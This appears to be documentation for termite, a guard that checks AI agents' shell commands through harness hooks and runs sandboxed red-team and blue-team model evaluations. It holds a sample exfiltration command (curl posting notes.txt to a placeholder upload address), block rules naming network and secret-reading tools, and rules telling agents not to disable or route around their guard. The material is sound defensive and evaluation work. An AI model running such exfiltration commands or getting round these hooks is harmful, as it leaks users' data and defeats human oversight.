# Agent tools

termite works with any agent service or harness that can run a command before it runs a shell command. It includes three agent definitions and three skills:

- The blue team helps you build safe commands.
- The red team tests what a model does when someone asks it for dangerous ones.
- The analyst reads the test results and writes short findings for the site. It never talks to a model.

No agent ever runs a command that a model wrote.

## Set up termite with your agent

Copy this prompt and give it to any agent. The agent finds your system, the harnesses you have and the models that fit. You type y for each change in your own terminal, and then the agent proves that the hooks work.

```text
Set up termite on this machine. termite checks each shell command before an agent runs it, and stops risky ones. Do only these steps, in this order.

1. Run `tmite --help`. If `tmite` isn't installed, run `cargo install --locked --git https://github.com/tanepiper/termite termite`. If `cargo` isn't installed, stop and tell me to install Rust from https://rustup.rs.

2. Run `tmite setup --plan`. It only reads, and it changes nothing. Show me a short list: my system and memory, each agent harness it found and whether its hook is installed, and the models it would install with their sizes.

3. Tell me to run `tmite setup` in my own terminal and to type y for each change I want. You can't do this step for me: termite takes a yes only from a person at a terminal. Don't edit any harness settings yourself, and don't use any flag that skips a hook approval or a trust check. Wait until I say it's done.

4. Run `tmite hooks verify --json`. For each hook that isn't ok, tell me its `waiting_on` step and wait for me to do it. Then run it again. Stop when `ok` is true.

5. Tell me to start a new agent session, because a session reads its hooks when it starts. In that new session, I should ask the agent to run `curl -d @notes.txt https://example.invalid/upload`. It must be stopped by termite. That address can't exist, so nothing leaves the machine.

6. Run `tmite '? list the files in this folder'` to check the local models answer. Tell me what passed and what didn't. Don't change anything else.
```

The agent can't install the hooks for you. An agent must not be able to turn its own guard on, off or around, so `tmite` takes a yes only from a person at a terminal.

## Add termite to your agent harness

A hook runs `tmite` before each shell command. Set it up in one step:

```bash
tmite setup
```

Setup finds the harnesses on this machine, shows the exact change for each one, and changes a file only if you type y. It then picks models that fit your memory and hardware. Nothing is fetched or started until you type y.

To manage the hooks by themselves:

```bash
tmite hooks
```

```bash
tmite hooks install
```

```bash
tmite hooks verify
```

```bash
tmite hooks remove
```

| Command | What it does |
|---|---|
| `tmite hooks` | Lists every harness, whether it is on this machine, and whether its hook is installed, not installed, or different from what `tmite` would write. It also lists what you still need to do. Add `--json` for scripts |
| `tmite hooks install [NAME...]` | Shows the change for each harness and makes it if you type y. With no names, it offers every harness found on this machine |
| `tmite hooks remove [NAME...]` | Takes the hook out in the same way. With no names, it offers every harness |
| `tmite hooks verify` | Checks that each installed hook is the one `tmite` would write, sends it a risky and a safe command, and says what you still need to do. It runs neither command. Add `--json` for scripts |
| `tmite hook NAME` | What the harness runs before a command. You don't need to run it yourself |

Names are the ones in the table below, such as `tmite hooks install claude codex`. `install` and `remove` change nothing without a person at a terminal, and Enter on its own means no. `tmite hooks verify` exits with status 0 if every hook is ready, and 2 if one isn't or none are installed.

The first change keeps the file as it was, next to the new one, with `.termite-backup` added to its name. Later changes leave that copy alone.

A hook never approves a command. It can stop a command, or [hand it to you](#commands-that-need-approval) in your harness's own prompt. A command that passes still goes through your harness's own approval rules.

If you moved a settings folder with `CLAUDE_CONFIG_DIR`, `CODEX_HOME`, `COPILOT_HOME` or `HERMES_HOME`, the hook goes in that folder instead. The variable must hold a full path.

| Harness | Name | Where the hook goes | What it can see | If the hook fails |
|---|---|---|---|---|
| Claude Code | `claude` | `~/.claude/settings.json`, or the plugin | Bash and Monitor | Stops the command |
| Codex | `codex` | `~/.codex/hooks.json` | Shell commands | Stops the command, except on a timeout |
| Gemini CLI | `gemini` | `~/.gemini/settings.json` | `run_shell_command` | Stops the command, except on a timeout |
| Cursor | `cursor` | `~/.cursor/hooks.json` | Shell commands | Stops the command |
| Antigravity | `antigravity` | `~/.gemini/config/hooks.json` | The `run_command` tool, in the app, the IDE and `agy` | Stops the command. In the app and the IDE, a timeout may let it run |
| GitHub Copilot CLI | `copilot` | `~/.copilot/hooks/termite.json` | Shell commands | Stops the command, except on a timeout |
| Hermes Agent | `hermes` | `~/.hermes/config.yaml` | The `terminal` tool | Stops the command |
| goose | `goose` | `~/.agents/plugins/termite/` | The `shell` tool | Stops the command |
| OpenCode | `opencode` | `~/.config/opencode/plugins/termite.js` | The `bash` tool | Stops the command |
| Windsurf | `windsurf` | `~/.codeium/windsurf/hooks.json` | Terminal commands | Stops the command, except on a timeout |

If `tmite` is missing or crashes, the command stops. Every shell command then stops until you fix `tmite` or remove the hook. `tmite` gives up and stops a command itself after 20 seconds, so a harness that lets a timed-out hook through should never reach that point. A machine too busy to run the hook at all is the one exception, in the harnesses marked above.

Two harnesses skip a new hook until you approve it, and `tmite hooks verify` tells you when one is waiting:

- **Codex:** run `/hooks` in Codex and trust the hook.
- **Hermes Agent:** answer yes when Hermes asks, then run `hermes hooks doctor`. The gateway, cron and `hermes acp` don't ask, so run Hermes once at a terminal first.

The hook uses the full path of the `tmite` that installed it. Install from the `tmite` you keep, not from a build folder. If you move `tmite`, every shell command stops and `tmite hooks verify` fails until you run `tmite hooks install` again. Restart your harness after you install a hook, because most read their hooks when they start.

### What a hook does

Each time the agent wants to run a shell command, the harness starts `tmite hook NAME` and sends it a JSON message on standard input. The hook then:

1. Reads the message, up to 4 MiB.
2. Finds the command and the working folder, in the place where that harness puts them.
3. Rates the command with the same rules as `TERMITE_AGENT=1 tmite check`. No model takes part, and nothing runs.
4. Answers in the harness's own format.
5. Writes a log entry if it stopped something or asked you.

The hook stops the command if:

- The command is critical, or at level 5.
- The command is risky under the [agent rules](#stop-an-agent-running-destructive-commands-or-sending-data-out) and [can't go to a person](#commands-that-need-approval).
- The message is too large, isn't valid JSON, or holds an empty command.
- The message holds no command, and the tool [could run one](#harnesses-that-send-every-tool).
- The working folder isn't known.
- The check takes more than 20 seconds.
- `tmite` is missing or crashes.

In every other case, the hook has no objection. This is not an approval: most harnesses get no output at all. Cursor, Antigravity and Hermes Agent need a reply, so they get the word that leaves their own rules in charge. The hook never uses a word that approves a command.

| Harness | Hook event | Filter | Where the command is | How it is told to stop |
|---|---|---|---|---|
| Claude Code | `PreToolUse` | `Bash\|Monitor` | `tool_input.command` | `permissionDecision: deny` in `hookSpecificOutput` |
| Codex | `PreToolUse` | `^Bash$` | `tool_input.command` | `permissionDecision: deny` in `hookSpecificOutput` |
| Gemini CLI | `BeforeTool` | `^run_shell_command$` | `tool_input.command` | `decision: deny` |
| Cursor | `beforeShellExecution` | None | `command` | `permission: deny` |
| Antigravity | `PreToolUse` | `^run_command$` | `toolCall.args.CommandLine` | `decision: deny` |
| GitHub Copilot CLI | `PreToolUse` | `Bash` | `tool_input.command` | `permissionDecision: deny` |
| Hermes Agent | `pre_tool_call` | `^terminal$` | `tool_input.command` | `decision: block` |
| goose | `PreToolUse` | `^shell$` | `tool_input.command` | `decision: block` |
| OpenCode | `tool.execute.before` | The `bash` tool | `tool_input.command`, sent by the plugin | The plugin throws an error |
| Windsurf | `pre_run_command` | None | `tool_info.command_line` | Exit status only |

Every harness also gets exit status 2 and the reason on standard error, so a stop works in whichever way the harness reads it. Antigravity documents only a decision on standard output, so its hook line always exits with status 0 and a decision.

Each hook has a 30 second limit where the harness lets `tmite` set one. Windsurf has no such setting. The hook stops the command itself at 20 seconds, before that limit.

What `tmite` writes depends on the harness:

- **Shared JSON settings:** Claude Code, Codex, Gemini CLI, Cursor, Antigravity and Windsurf get one entry, and the rest of the file keeps its order.
- **A shared YAML file:** Hermes Agent gets a marked block. It runs the hook without a shell, so `fail_closed` stops the command if `tmite` fails.
- **Files of its own:** GitHub Copilot CLI, goose and OpenCode get files that belong to termite alone. OpenCode's is a small plugin that sends each `bash` command to `tmite hook opencode`.

In the shell lines, `|| exit 2` stops the command if `tmite` can't start.

### When a hook stops a command

The agent gets the level, the reason and the command, and it is told not to try another way:

```text
termite stopped this command. Don't try another way to do the same thing: tell the person what you wanted to run and why.
✗ command:1  level 4, critical: sends data off the machine, can carry data off the machine, may change something
    curl -d @notes.txt https://example.com/upload
```

If you want the command to run, read it, then run it yourself in your own terminal.

`tmite alerts` shows when hooks stopped something or asked you. It doesn't keep the command or what you answered, so read the command in the agent's session. If a stop can't be logged, the hook prints a line on standard error, which your harness may not show. `tmite provenance verify` tells you why.

A hook has no setting that lets one command through. If an ordinary command keeps stopping, it may be a rule that is too strict, so [open an issue](https://github.com/tanepiper/termite/issues).

### Commands that need approval

Some commands aren't safe for an agent to run alone, but a person could reasonably say yes to them, such as a cloud command, a network lookup or a command that needs root. The hook sorts each command in this way:

| Answer | Which commands | What happens |
|---|---|---|
| Pass | Fit for an agent | The harness's own rules decide |
| Needs approval | Not fit for an agent, at levels 0 to 4, and not critical | Your harness shows its own prompt, with termite's reason. Yes runs the command, and no doesn't |
| Stop | Level 5, anything critical, or input that can't be read | The command stops, and nobody is asked |

A script takes the worst answer of its commands.

The question goes out as a normal reply, so a harness that ignored it would run the command. For this reason, a harness only gets the question after a live trial has shown that it prompts, that no stops the command, and that the command doesn't run when nobody can answer. The trial must also cover any mode that approves everything, or the hook must be able to see that mode. Everywhere else, the command stops, and the agent is told to give you the command to run yourself.

| Harness | Commands that need approval |
|---|---|
| Claude Code | Asks you, except in bypass permissions mode, which stops the command. Where nobody can answer, the command doesn't run |
| GitHub Copilot CLI | Stops, because VS Code reads the same hook and looks the same to it |
| Antigravity `agy` | Stops, because its setting that approves everything hasn't been tried |
| Antigravity app and IDE | Stops, because this hasn't been tried |
| GitHub Copilot in VS Code | Stops, because Allow all ran the command with no prompt in a trial, and the hook can't see that mode |
| Cursor | Stops, because its agent ran the command in a trial |
| Codex | Stops, because it lets the command continue |
| Gemini CLI, Hermes Agent, goose, OpenCode, Windsurf | Stops, because this hasn't been tried |

`tmite hooks verify` shows which of your hooks can ask. No flag or setting turns the question on for another harness.

### What a hook lets through

A hook stops a command with a known hazard. If it finds none, the command goes through. That doesn't mean the command is safe, only that termite found nothing wrong with it.

Some commands run code that isn't in the command, so termite can't read it:

| Command | What it runs |
|---|---|
| `npm run build`, `make deploy`, `cargo run` | The project's own scripts |
| `python -m module` | A module installed on your machine |
| `npx package` | A package, which it may download first |
| A program termite doesn't know | Whatever that program does |

An agent may run these because they are most of its everyday work. If each one stopped, you would have to approve every build and test, and you would soon stop reading them.

Other commands are stopped, because termite can see that code is being run and can't check it. Examples are `python -c`, `bash -c`, and a script file that it can't find.

If you don't trust the project, or the packages it uses, run the agent in a container or virtual machine with no network.

### Harnesses that send every tool

Some harnesses ignore the hook's filter and send every tool to the hook, not only shell commands. A tool that has no command, such as one that reads a file, has nothing to check, so the hook lets it continue. If a tool's name suggests that it can run something, or it has a field that can hold a command, and the hook can't find the command, the tool stops. Some tools that run nothing will stop for this reason.

### VS Code

GitHub Copilot in VS Code can read hooks from several places. These two settings decide which:

- `chat.hookFilesLocations` lists the files and folders that it reads.
- `chat.useClaudeHooks` lets it read Claude Code's settings files.

If both include Claude Code's settings, every Claude Code hook also runs in VS Code, including the termite hook and any others you have. To keep the two apart, set `chat.useClaudeHooks` to `false`, remove the `.claude` entries from `chat.hookFilesLocations`, and keep `~/.copilot/hooks`. Then install the Copilot hook, which VS Code reads from that folder:

```bash
tmite hooks install copilot
```

Start a new chat after you change these settings. This hook hasn't been tested in VS Code yet, so check it by asking the agent to run the `curl` command from the prompt above. Commands that need approval stop in VS Code for now. VS Code's newer Copilot session target finds hooks in a different way from the local one, so test it there too if you use it.

To use the Claude Code plugin instead of the settings file, `tmite` must be on the `PATH` that Claude Code gets:

```text
/plugin marketplace add tanepiper/termite
```

```text
/plugin install termite@termite
```

These can't be hooked, so they are not supported:

| Harness | Why |
|---|---|
| Aider | It has no hook before a command. It asks you before it runs one, so read each command, or check it with `tmite check`. Don't use `--yes-always`. |
| Cline | Its hooks are TypeScript plugins that let a tool run when a hook fails or takes more than 3 seconds. |
| Continue | Its documents describe no hook before a command. |

Devin reads hooks from `~/.claude/settings.json`, but it gives the tool a different name, so the Claude Code hook doesn't cover it.

A hook sees only the tools listed above. It can't see a tool that writes files or fetches web pages, or an MCP server's tools. Nothing stops an agent editing its own settings with those tools, so to stop data leaving for certain, run the agent in a container or a virtual machine with no network.

## Local models

`tmite setup` picks the largest chat model and decision model that fit this machine. It counts 60% of memory on Apple silicon, 90% of a graphics card's memory on Linux, and half of memory otherwise. To see what it would pick, without changing anything:

```bash
tmite setup --plan
```

Each model is one GGUF file at a fixed revision. `tmite` checks the file's size and SHA-256 before it uses the file, and it never runs code from a model repository. Files go in `~/.cache/termite/models`, and `llama-server` serves them on this machine only. If you don't have `llama-server`, setup tells you how to install it.

Ollama and LM Studio still work if you already run them, but setup doesn't fetch models for them, because their model names can change what they point to.

## Stop an agent running destructive commands or sending data out

The hooks above do this for you. To add it to any other harness, send each shell command to `tmite check` before the agent runs it. The check reads the command from standard input. Set `TERMITE_AGENT` in the hook, so the check treats the caller as an agent whatever it can detect:

```bash
printf '%s' "$command" | TERMITE_AGENT=1 tmite check >&2
```

An agent gets stricter rules than a person, because nobody reads its commands first. The check stops:

- Level 4 and level 5: anything that reaches outside the project, needs root, or changes the system.
- Anything that may show a secret or private data.
- Anything that can carry data to another machine, at any level. This includes `curl` that sends anything, `wget`, `ssh`, `scp`, DNS lookups, cloud tools, uploads, publishing, the clipboard, and opening a web address.
- Code written in the command itself, such as `python3 -c`, when it uses words that reach another machine, start a program, delete files, find the home folder or name a secret. A script file is searched in the same way.
- A change to a file that runs later by itself: a shell startup file in your home folder, or a git hook.

Work that stays inside the project passes, up to level 3. This includes git work, builds, tests, edits, and deleting files in the project or files in a temporary folder that are named in full. Work that stays on the machine, such as `curl` to `localhost`, also passes. `gh api` passes when it only reads. `curl` to another machine passes when it only fetches: it sends no body, header or file, it writes no file, and its address is written out in full. The address itself is still sent, so a fetch can carry whatever is written in it. Every cloud command stops, including ones that only read, so run it yourself.

`tmite check` only passes or stops. The [hooks](#commands-that-need-approval) can ask you about some of these commands in place of stopping them.

The exit status tells your harness what to do:

| Status | Meaning | What your harness should do |
|---|---|---|
| 0 | The check found nothing risky | Run the command |
| 2 | The check found something risky, or found no command | Stop, and give the agent the reason |
| 1 | The check could not read the input | Stop |
| 64 | The check was called incorrectly | Stop |

Add this as a pre-command hook, a tool wrapper or a policy step, whichever your harness supports. Treat every status except 0 as a stop. `tmite` must be on your `PATH`.

The check blocks only what it can see, so read [what it misses](using-termite.md#check-a-script-or-a-pipe). When a command runs a script, the check reads the script first, and stops one that reaches out or reads secrets, or that it can't read. Scripts that use many tools will often stop. A script can still hide what it does, and the check doesn't look inside `npm test`, `make` or what a script imports. It also can't see an agent's other tools, such as one that writes files or fetches web pages. To stop data leaving for certain, run the agent in a container or a virtual machine with no network.

The check reads the whole command as one text. A variable that the command sets and then uses has its value put in place, so `S=out; cp a $S/b` is read as `cp a out/b`. Text that a here-document gives to a program is judged by what the program does with it: a shell runs it, so it is read as commands, and a program that only saves or prints it can't run it, so it isn't read as commands. A variable alone doesn't stop a command. A path, a program or code that is only known when the command runs is counted where it is used, so `rm -rf $X` still stops.

`grep -r` passes for a folder inside the project that holds no file with a secret's name. It stops for the project folder itself, and for any folder outside the project. `rg` skips ignored files, so it passes.

## Before you start

You need a clone of this repository, an agent harness that can load instructions from files, the models you want to use, and Docker for the red team. Build the tool once:

```bash
cargo build --example eval
```

Check where each team can work:

```bash
scripts/team.sh gate
```

## Blue team: build a safe command

Ask for the agent by name, or tell your agent to follow the skill:

```text
Use termite-blue-team to find what is using my disk space.
```

It asks the best model on the roster, in the sandbox, and then gives you the command, what it does, its rating and every warning. You decide whether to run the command.

You can use the same tools without an agent:

```bash
scripts/team.sh blue 'find files bigger than 100MB in this folder'
```

```bash
scripts/team.sh check 'du -sh .'
```

## Red team: test dangerous requests

Test only a model that you are responsible for.

```text
Use termite-red-team to test whether this model will read my SSH keys.
```

It asks the worst models on the roster, in a locked-down container, and tells you what they wrote and what to restrict. Commands that can do real harm are not shown.

Without an agent:

```bash
scripts/team.sh red 'REQUEST'
```

Answers are saved in `eval/results/team/`. Git ignores that folder; keep it private.

Do not publish what you find. If you find a real weakness, tell the people responsible for the model privately, and give them time to fix it.

## How the models are picked

`eval publish` writes `eval/roster.jsonl` from the latest scores, so nobody chooses the models by hand:

| Team | Gets | Why |
|---|---|---|
| Blue | The models that wrote the fewest hazards for hostile requests | These give the safest draft available |
| Red | The models that wrote the most hazards | These show the worst that could be handed over |

A model must answer at least 90% of everyday requests to be on either list, because a model that cannot write good commands is no use to either team.

"Best" means the best of the models tested. The [model ratings](/termite/models/) show that the best model may still write a hazard for most hostile requests, so termite's policy rates each command and does not trust the model.

To see the lists:

```bash
scripts/team.sh roster
```

## The gates

Every model test checks where it is running before it starts, and it refuses to start if that place is not safe enough. The tool makes this check itself, so an agent cannot persuade it to continue. The check really attempts to write to the source and reach the internet, so setting a variable changes nothing.

| Check | Blue team | Red team |
|---|---|---|
| In a Docker container or a virtual machine | Not needed | Required |
| Source folder cannot be written to | Required | Required |
| `.env` and known secret variables cannot be read | Required | Required |
| Internet cannot be reached | Required | Required |

No override, flag or sign-in can lower a gate. If a gate refuses, fix the place you are running in.

Configure your harness to add a second restriction: the agents may use no shell command except `scripts/team.sh`, on its own, with the text in single quotes.

## Where each team runs

**The sandbox** is for the blue team, and it uses macOS `sandbox-exec`. Run this command to confirm that every rule holds:

```bash
scripts/sandbox.sh --check
```

On Linux, the blue team uses the container instead.

**The container** is for the red team. `scripts/container.sh` starts it with no internet, a read-only filesystem, no privileges, no source and no secrets. It can write only to `eval/results/team/`.

Models run on your machine, so both places need to reach the models and nothing else:

- The sandbox can reach the model ports on localhost. It cannot reach other local services or sockets, such as a password manager or Docker.
- The container reaches the model ports through a small bridge that forwards those ports and nothing else. The bridge is removed when the run ends.

The ports come from `eval/models.jsonl`, `eval/decision-models.jsonl` and your termite config. termite does not support a model server on another machine.

## Load the agents in your harness

The agent definitions are plain Markdown in `agents/`, and the skills are plain Markdown in `skills/`. `.claude/` holds links to these files for Claude Code. Any harness can use them: load the files as instructions, or copy their text into your harness's own format. The gates work with every harness, because they are in the tool.
